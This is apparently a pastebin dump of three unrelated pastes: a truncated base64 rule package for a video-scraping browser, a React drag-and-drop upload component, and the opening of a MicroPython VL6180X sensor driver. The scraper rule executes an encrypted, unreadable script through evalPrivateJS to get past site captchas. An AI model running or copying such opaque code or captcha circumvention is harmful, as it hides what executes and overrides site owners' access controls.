T5p6cLykpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBmYWxzZVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiBpdC5pbmNsdWRlcyhrZXkpO1xcXFxuICAgIH1cXFxcblxcXFxuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYXJyLmxlbmd0aDsgaSsrKSB7XFxcXG4gICAgICAgIGxldCBpdCA9IGFycltpXTtcXFxcbiAgICAgICAgbGV0IHQgPSBpdC50ZXh0O1xcXFxuICAgICAgICBpZiAoIWl0LmhyZWYgfHwgaXQuaHJlZiA9PSBcXFxcXFxcIlxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICBjb250aW51ZTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpZiAoaXNSZXN1bHQoaXQpKSB7XFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiB0LFxcXFxuICAgICAgICAgICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UvcD91PVxcXFxcXFwiICsgYmFzZTY0RW5jb2RlKGl0LmhyZWYpICsgXFxcXFxcXCImbW92dGl0bGU9XFxcXFxcXCIgKyBiYXNlNjRFbmNvZGUodCksXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgZGVzYzogXFxcXFxcXCLigJzigJzigJ3igJ08Zm9udCBjb2xvcj0jZjEzYjY2YT5cXFxcXFxcIiArIHJ1bGUgKyBcXFxcXFxcIjwvZm9udD5cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICBpbmhlcml0VGl0bGU6IGZhbHNlXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIGQ7XFxcXG59XFxcXG4kLmV4cG9ydHMgPSBzZWFyY2g7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5aKe5YigXFxcIixcXFwicGF0aFxcXCI6XFxcIm1hbmFnZVxcXCIsXFxcInJ1bGVcXFwiOlxcXCIkLmV4cG9ydHMgPSBmdW5jdGlvbihkLCBuYW1lcykge1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIkFJ5oqA5pyvXFxcXFxcXCIsXFxcXG4gICAgICAgIHVybDogXFxcXFxcXCJjb25maXJtOi8v5Z+65LqOQUnor4bniYfoh6rliqjliIbmnpDmupDnoIHmioDmnK/vvIzku6PnoIHlrozlhajlvIDmupDvvIzmlbDmja7mnaXmupDkuo7ljp/nvZHnq5nvvIzova/ku7blkozop4TliJnkuI3mj5Dkvpvku7vkvZXlhoXlrrkuanM6JydcXFxcXFxcIixcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiZmxleF9idXR0b25cXFxcXFxcIlxcXFxuICAgIH0sIHtcXFxcbiAgICAgICAgdGl0bGU6IGdldEl0ZW0oJ3dlYicsICcwJykgPT0gXFxcXFxcXCIwXFxcXFxcXCIgPyBcXFxcXFxcIuinhumikeWXheaOolxcXFxcXFwiIDogXFxcXFxcXCJXZWLpgJrlhY1cXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKCkgPT4ge1xcXFxuICAgICAgICAgICAgaWYgKGdldEl0ZW0oJ3dlYicsICcwJykgPT0gXFxcXFxcXCIwXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICBzZXRJdGVtKCd3ZWInLCAnMScpXFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIHNldEl0ZW0oJ3dlYicsICcwJylcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXG4gICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgICAgIH0pLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJmbGV4X2J1dHRvblxcXFxcXFwiXFxcXG4gICAgfSk7XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwiICsgXFxcXFxcXCIsXFxcXG4gICAgICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChycikgPT4ge1xcXFxuICAgICAgICAgICAgZGVsZXRlSXRlbUJ5Q2xzKFxcXFxcXFwiYWlhZGRcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBhZGRJdGVtQWZ0ZXIocnIgKyBcXFxcXFxcImFpc2RlbFxcXFxcXFwiLCBbe1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogXFxcXFxcXCLor7fovpPlhaXnvZHnq5nlkI3np7BcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiaW5wdXRcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlVmlzaWJsZTogZmFsc2UsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBvbkNoYW5nZTogXFxcXFxcXCJwdXRNeVZhcignbmFtZScsIGlucHV0KVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY2xzOiBcXFxcXFxcImFpYWRkXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICAgICAge1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogXFxcXFxcXCLor7fovpPlhaXnvZHnq5nmkJzntKLlnLDlnYBcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiaW5wdXRcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlVmlzaWJsZTogZmFsc2UsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBvbkNoYW5nZTogXFxcXFxcXCJwdXRNeVZhcignc3VybCcsIGlucHV0KVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY2xzOiBcXFxcXFxcImFpYWRkXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICAgICAge1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLmj5DkuqTkv53lrZhcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF9jZW50ZXJfMVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgc3VybCA9IGdldE15VmFyKFxcXFxcXFwic3VybFxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBuYW1lID0gZ2V0TXlWYXIoXFxcXFxcXCJuYW1lXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHN1cmwgPT0gXFxcXFxcXCJcXFxcXFxcIiB8fCBuYW1lID09IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+ivt+i+k+WFpeWujOaVtOWGheWuuVxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgciA9IGRlY29kZVVSSUNvbXBvbmVudChzdXJsKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHIgPSByLnJlcGxhY2UobmV3IFJlZ0V4cChcXFxcXFxcIltcXFxcXFxcXHU0ZTAwLVxcXFxcXFxcdTlmYTVdK1xcXFxcXFwiLCBcXFxcXFxcImdcXFxcXFxcIiksIFxcXFxcXFwiKipcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFkZFJ1bGVcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvZGF0YVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGFkZFJ1bGUobmFtZSwgcik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/lt7Lkv53lrZhcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgfSksXFxcXG4gICAgICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjbHM6IFxcXFxcXFwiYWlhZGRcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgXSk7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICAgICAgfSwgTVlfUlVMRS50aXRsZSksXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImZsZXhfYnV0dG9uXFxcXFxcXCIsXFxcXG4gICAgfSk7XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwiIC0gXFxcXFxcXCIsXFxcXG4gICAgICAgIHVybDogXFxcXFxcXCJzZWxlY3Q6Ly9cXFxcXFxcIiArIEpTT04uc3RyaW5naWZ5KHtcXFxcbiAgICAgICAgICAgIG9wdGlvbnM6IG5hbWVzLFxcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi6K+36YCJ5oup6KaB5Yig6Zmk55qE56uZ54K5XFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBqczogJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVtb3ZlUnVsZVxcXFxuICAgICAgICAgICAgICAgIH0gPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvZGF0YVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICByZW1vdmVSdWxlKGlucHV0KTtcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8vT0tcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgIH0pLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJmbGV4X2J1dHRvblxcXFxcXFwiLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgaWQ6IE1ZX1JVTEUudGl0bGUgKyBcXFxcXFxcImFpc2RlbFxcXFxcXFwiXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJibGFua19ibG9ja1xcXFxcXFwiXFxcXG4gICAgfSk7XFxcXG5cXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLpqozor4HnoIFcXFwiLFxcXCJwYXRoXFxcIjpcXFwieXptXFxcIixcXFwicnVsZVxcXCI6XFxcImZ1bmN0aW9uIGNoZWNrKHVybCwgaHRtbCwgZCkge1xcXFxuICAgIGxldCByZWxvYWQgPSBmYWxzZTtcXFxcbiAgICBpZiAoL+mqjOivgeeggXzns7vnu5/lronlhajpqozor4EvLnRlc3QoaHRtbCkpIHtcXFxcbiAgICAgICAgbGV0IGhlYWRlcnMgPSB7XFxcXG4gICAgICAgICAgICBcXFxcXFxcIlVzZXItQWdlbnRcXFxcXFxcIjogTU9CSUxFX1VBLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJSZWZlcmVyXFxcXFxcXCI6IHVybFxcXFxuICAgICAgICB9O1xcXFxuICAgICAgICBNWV9IT01FID0gZ2V0SG9tZSh1cmwpO1xcXFxuICAgICAgICBsZXQgc3N5eiA9ICdUbG9Hbm5pa1RocmZzLzVmRE5sazVDU3NiYUd0QUg3Vy91TVpqdVlvSXVwQjZiQ29vOUNvdExRSGZQSWRHZ2JrYnluS3FMMmFVRTJYeTU1OFgyUXhIWXRUVTA5dkQrNG9hQ0RJdVNaTzdueERiTGZSR2ZXajd6cWwreU1idkYrYUpvRC9tNlBzZncvUHlZT0FwL1pWR2RyUHphQ0J5ZmQwSEw1REZWU3crWUYyT0M0MFY4U1A5UnhkRktLZHJCdVB4Q1dkeFVDRnJKKzFsUnkvVFUzTEM4NEM0eHhFQmhndWQ3UnRCcDB6WkFycUJFMDYrWjNKdERQMGVGQ3ovRDVYMDQwOXFQSEszZTF5L0x1VWdjY3V4cEhuallMRTFHamxQOHdZQTJoUVdlN3lQbmdnZ1FCSHczMy9ndmIzdHVDY3hFS1RXZ21haC9SMzJBSDlaRjhqRjdXZW1UMjZsVWl6VlhlL3NwQ2RoRGdIUi96VWhPREQ0UE82Z2xJOEpQaGR1K1Z3ZlB5UkxHMkQ3Q1VvMUw2U0lGKzBmWWYwb1RPV04xM1VQSVRvNSt1WmQvV25RUUxVOE5ZeC9XRkNUaEVua2J6bG45WUd0NjBmUnhzSCs4dU1ERmdhQmlDK3oyU3BjeEI5Z1o2R1h5cExTWFdhaitxRVViR0pLRXgraksvdjVmbnJrSWhDZHdOYmtwOWRSa3M2ZG1sWWxCaWZ6b1dGOFJrdUMzcnFQdG9TY0JrTU9NWnU3R2lWdG9IRWRIVW96bW5VSWRyVTFMR0lxcTlXbkc3WDJhM3lIOHM2NW1qTHVMbmQzcTBVOHYrTE1QbkhMMi9HalF1VFFLVmgrUktFUHFLL0pkckNoR0xOcmpjSHZMSERiSEVzaHJHWnVRT2RFcGhieC9Qa2hrdmFZeTRLMU1PODRSMTdndVJzS3MvVjZuaVVQYUwrWGJRN2MzZnFKUzRWSEp3bHVkSlREZTAyZXVmZkdDbTBQSklQbEFPZ0xIblgwaXpKaEE2cTczOFIyVXdRY1dCUWpKdDc5YUYra3lxU2R5dDFRUFZRVmphQzNJcFJmN1Bnc0RoRUo3Ymk5blNjbHlJemdKOURDSjRUKzhkRzF4SGhLeVphc1Q3TC94OUxmcjFNZ3M4bkJaRVIyVzlheDdpVGtOSytYNUFDVS8vcC9Zb1AvdUFhbkR0YjNEMGlLVVV1WEZIK0piYjB4MVAzMjJTMnc2Qko0Nm51TkhCTUhUcFZ1V3doWmVaenJpR2g3cW9PeXdMV2lFeEJNS3l4VEdMbm1LaDdyMDMveVhLWVdJSm5wQk4yTU15Y1ZIUlpKN1J1bUhWNENJc1ZycTdpUlA0ODgyM1JKVnQ5T3R5UDd1dWMzd0JCVjNrY1pVemJiYVlkV0J4MStBdStPZDJ1N2xSNmpvT0w4MTBtY0ptL2Y3SjVUdkdRUDZIR3BoMVlISFg0Qzc0NTNhN3VWSHFPZ3lqamg1RUJkNzIwTUVCWTIzYytUS3EvejlVcFdERE9nNDhaRm53U0loRnFpdFdkaVppcXNhWXVOMC9TWHdpSzhFRzllUTI5dTJYREpvRFc0bWx3dGNSTzd2YVg1WGNGc2dmNC9tTFUwN21pJztcXFxcbiAgICAgICAgZXZhbFByaXZhdGVKUyhzc3l6KTtcXFxcblxcXFxuICAgICAgICBsZXQgdmNvZGUgPSBnZXRWQ29kZTIoTVlfSE9NRSArICcvaW5kZXgucGhwL3ZlcmlmeS9pbmRleC5odG1sPycsIEpTT04uc3RyaW5naWZ5KGhlYWRlcnMpLCAnbnVtJyk7XFxcXG4gICAgICAgIGZldGNoKE1ZX0hPTUUgKyBodG1sLm1hdGNoKC9cXFxcXFxcXC9pbmRleC5waHAuKj92ZXJpZnk9LylbMF0gKyBKU09OLnBhcnNlKHZjb2RlKS5yZXQsIHtcXFxcbiAgICAgICAgICAgIGhlYWRlcnM6IGhlYWRlcnMsXFxcXG4gICAgICAgICAgICBtZXRob2Q6ICdQT1NUJ1xcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgcmVsb2FkID0gdHJ1ZTtcXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIHJlbG9hZDtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gdGVzdCh1cmwsIGh0bWwsIGQsIG9sZCwga2V5LCBydWxlKSB7XFxcXG4gICAgaWYgKC8156eSfOmikee5gS8udGVzdChodG1sKSkge1xcXFxuICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6ICfmkJzntKLpnIDpl7TpmpQ156eS77yM54K55Ye76YeN5paw5Yqg6L29JyxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZGVzYzogXFxcXFxcXCLigJzigJzigJ3igJ08Zm9udCBjb2xvcj0jZjEzYjY2YT5cXFxcXFxcIiArIHJ1bGUgKyBcXFxcXFxcIjwvZm9udD5cXFxcXFxcIixcXFxcbiAgICAgICAgICAgIHVybDogJCgpLmxhenlSdWxlKCh1cmwsIG9sZCwga2V5LCBydWxlKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHNwID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3NwXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIGxldCBkID0gc3Aob2xkLCBrZXksIHJ1bGUpO1xcXFxuICAgICAgICAgICAgICAgIGxldCB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHdyYXBcXFxcbiAgICAgICAgICAgICAgICB9ID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3Rvb2xcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgZm9yIChsZXQgaXQgb2YgZCkge1xcXFxuICAgICAgICAgICAgICAgICAgICBpdC50aXRsZSA9IHdyYXAoaXQudGl0bGUsIGtleSk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGFkZEl0ZW1BZnRlcih1cmwsIGQpO1xcXFxuICAgICAgICAgICAgICAgIGRlbGV0ZUl0ZW0odXJsKTtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL09LXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICB9LCB1cmwsIG9sZCwga2V5LCBydWxlKSxcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgaWQ6IHVybFxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KTtcXFxcbiAgICB9XFxcXG59XFxcXG5cXFxcbiQuZXhwb3J0cyA9IHtcXFxcbiAgICBjaGVjazogY2hlY2ssXFxcXG4gICAgdGVzdDogdGVzdFxcXFxufVxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuW3peWFt1xcXCIsXFxcInBhdGhcXFwiOlxcXCJ0b29sXFxcIixcXFwicnVsZVxcXCI6XFxcImZ1bmN0aW9uIHdyYXAodGV4dCwgcykge1xcXFxuICAgIHJldHVybiB0ZXh0LmluY2x1ZGVzKFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIpID8gdGV4dCA6IFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIgKyB0ZXh0LnJlcGxhY2UobmV3IFJlZ0V4cChcXFxcXFxcIjxlbT58PC9lbT5cXFxcXFxcIiwgXFxcXFxcXCJnXFxcXFxcXCIpLCBcXFxcXFxcIlxcXFxcXFwiKS5yZXBsYWNlKG5ldyBSZWdFeHAocywgXFxcXFxcXCJnXFxcXFxcXCIpLCBcXFxcXFxcIjxzdHJvbmc+PHNwYW4gc3R5bGU9XFxcXFxcXFxcXFxcXFxcImNvbG9yOiAjMUU5MEZGXFxcXFxcXFxcXFxcXFxcIj5cXFxcXFxcIiArIHMgKyBcXFxcXFxcIjwvc3Bhbj48L3N0cm9uZz5cXFxcXFxcIilcXFxcbn1cXFxcbiQuZXhwb3J0cyA9IHtcXFxcbiAgICB3cmFwOiB3cmFwXFxcXG59XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5Y2V5pCcXFxcIixcXFwicGF0aFxcXCI6XFxcInNpbmdsZXNcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG52YXIgZCA9IFtdO1xcXFxuZC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLmkJzntKJcXFxcXFxcIixcXFxcbiAgICB1cmw6ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICBwdXRNeVZhcihcXFxcXFxcInNvXFxcXFxcXCIsIGlucHV0KTtcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICB9KSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJpbnB1dFxcXFxcXFwiLFxcXFxuICAgIGRlc2M6IFxcXFxcXFwi6K+36L6T5YWl5YWz6ZSu6K+N77yM5bC96YeP5bCR5a2X5LiN6KaB5aSa5a2XXFxcXFxcXCIsXFxcXG4gICAgcGljX3VybDogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICBkZWZhdWx0VmFsdWU6IGdldE15VmFyKFxcXFxcXFwic29cXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIilcXFxcbiAgICB9XFxcXG59KTtcXFxcbmxldCBzID0gZ2V0TXlWYXIoXFxcXFxcXCJzb1xcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbmxldCByID0gXFxcXFxcXCJcXFxcXFxcIjtcXFxcbmlmIChzICE9IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICBsZXQgcCA9IE1ZX1BBR0U7XFxcXG4gICAgbGV0IHtcXFxcbiAgICAgICAgbG9hZFxcXFxuICAgIH0gPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvZGF0YVxcXFxcXFwiKTtcXFxcbiAgICBsZXQge1xcXFxuICAgICAgICB3cmFwXFxcXG4gICAgfSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS90b29sXFxcXFxcXCIpO1xcXFxuICAgIGxldCBkYXRhID0gbG9hZChwLCBNWV9QQVJBTVMuUlVMRS5uYW1lKTtcXFxcbiAgICBsZXQgYXJyID0gZGF0YVswXS5maW5kKHMsIHApO1xcXFxuICAgIGZvciAobGV0IGl0IG9mIGFycikge1xcXFxuICAgICAgICBpdC50aXRsZSA9IHdyYXAoaXQudGl0bGUsIHMpXFxcXG4gICAgICAgIGQucHVzaChpdCk7XFxcXG4gICAgfVxcXFxufVxcXFxuc2V0UmVzdWx0KGQpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuaQnOe0oumhtemdolxcXCIsXFxcInBhdGhcXFwiOlxcXCJzb3VwXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxudmFyIGQgPSBbXTtcXFxcbmlmIChNWV9QQVJBTVMua2V5ICYmIGdldE15VmFyKFxcXFxcXFwidXNlXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpID09IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICBwdXRNeVZhcihcXFxcXFxcInNvdVxcXFxcXFwiLCBNWV9QQVJBTVMua2V5KTtcXFxcbiAgICBwdXRNeVZhcihcXFxcXFxcInVzZVxcXFxcXFwiLCBcXFxcXFxcIjFcXFxcXFxcIik7XFxcXG4gICAgYWRkTGlzdGVuZXIoXFxcXFxcXCJvbkNsb3NlXFxcXFxcXCIsICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICBjbGVhck15VmFyKFxcXFxcXFwidXNlXFxcXFxcXCIpO1xcXFxuICAgIH0pKTtcXFxcbn1cXFxcbiQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL3BybycpXFxcIn1dXCJ9IiwidGl0bGUiOiLpmL/lh6Hovr4y77ya5rC05LmL6YGTIn0=
ebt6QX3f,Untitled,martastain,JavaScript,Tuesday 4th of July 2023 07:05:03 AM CDT,"import { useState, useMemo } from 'react'
import styled from 'styled-components'

const AppContainer = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 20px;
`

const DropZone = styled.form`
  border: 2px dashed #666;
  border-radius: 5px;
  width: 400px;
  display: flex;
  flex-direction: column;
  gap: 10px;
  min-height: 100px;
`

const FileBox = styled.div`
  display: flex;
  justify-content: space-between;
  padding: 5px;
  border: 1px solid #666;
  border-radius: 5px;
  flex-direction: column;
`

const FileUpload = ({ files, setFiles }) => {
  const [dragActive, setDragActive] = useState(false)

  const handleDrag = (e) => {
    e.preventDefault()
    e.stopPropagation()
    if (e.type === 'dragenter' || e.type === 'dragover') {
      setDragActive(true)
    } else if (e.type === 'dragleave') {
      setDragActive(false)
    }
  }

  const handleDrop = (e) => {
    e.preventDefault()
    e.stopPropagation()
    setDragActive(false)
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      handleFiles(e.dataTransfer.files)
    }
  }

  const handleFiles = (newFiles) => {
    const acceptedFiles = []

    for (const file of newFiles) {
      const now = new Date()
      file.sequenceId = `${now.getTime()}`
      acceptedFiles.push(file)
    }
    setFiles((files) => [...(files || []), ...acceptedFiles])
  }

  return (
    <DropZone 
      onDragEnter={handleDrag} 
      onDragLeave={handleDrag}
      onDragOver={handleDrag}
      onDrop={handleDrop}
      onSubmit={(e)=>e.preventDefault()}
    >
      {files.map((file) => (
        <FileBox key={`${file.name}-${file.sequenceId}`}>
          <span>{file.name}</span>
          <span>{file.size}</span>
          <span>{file.sequenceId}</span>
        </FileBox>
      ))}
      {dragActive && <p>Dragging {JSON.stringify(dragActive)}</p>}
    </DropZone>
  )
}


function App() {
  const [files, setFiles] = useState([])

  const sequences = useMemo(() => {
    const sequences = {}
    for (const file of files) {
      if (!sequences[file.sequenceId]) {
        sequences[file.sequenceId] = 0
      }
      sequences[file.sequenceId] += 1
    }
    return sequences
  }, [files])


  return (
    <AppContainer>
      <h1>Drag and Drop</h1> 
      <FileUpload files={files} setFiles={setFiles} />

      <h2>Sequences</h2>

     
      <ul>
        {Object.keys(sequences).map((sequenceId) => (
          <li key={sequenceId}>
            {sequenceId} - {sequences[sequenceId]}
          </li>
        ))}
      </ul>


    </AppContainer>
  )
}

export default App
"
NGTWY5LF,VL6180X for Micropython 1.20+,DeaD_EyE,Python,Tuesday 4th of July 2023 06:36:47 AM CDT,"# SPDX-FileCopyrightText: 2023 Andre Müller
# SPDX-License-Identifier: MIT

""""""
`adafruit_vl6180x`
====================================================

CircuitPython module for the VL6180X distance sensor.  See
examples/simpletest.py for a demo of the usage.

* Author(s): Tony DiCola, Jonas Schatz

Implementation Notes
--------------------

**Hardware:**

* Adafruit `VL6180X Time of Flight Distance Ranging Sensor (VL6180)
  <https://www.adafruit.com/product/3316>`_ (Product ID: 3316)

**Software and Dependencies:**

* Adafruit CircuitPython firmware for the ESP8622 and M0-based boards:
  https://github.com/adafruit/circuitpython/releases
* Adafruit's Bus Device library: https://github.com/adafruit/Adafruit_CircuitPython_BusDevice

**Update for Micropython:**
This module was updated and works with ESP32 and Micropython 1.20+

**Bugs**
read_lux does not work with my VL6180X distance sensor.
I guess it's a bug.
""""""

import struct
import time

from micropython import const

# Registers
_VL6180X_REG_IDENTIFICATION_MODEL_ID = const(0x000)

_VL6180X_REG_SYSTEM_HISTORY_CTRL = const(0x012)
_VL6180X_REG_SYSTEM_INTERRUPT_CONFIG = const(0x014)
_VL6180X_REG_SYSTEM_INTERRUPT_CLEAR = const(0x015)
_VL6180X_REG_SYSTEM_FRESH_OUT_OF_RESET = const(0x016)

_VL6180X_REG_SYSRANGE_START = const(0x018)
_VL6180X_REG_SYSRANGE_INTERMEASUREMENT_PERIOD = const(0x01B)
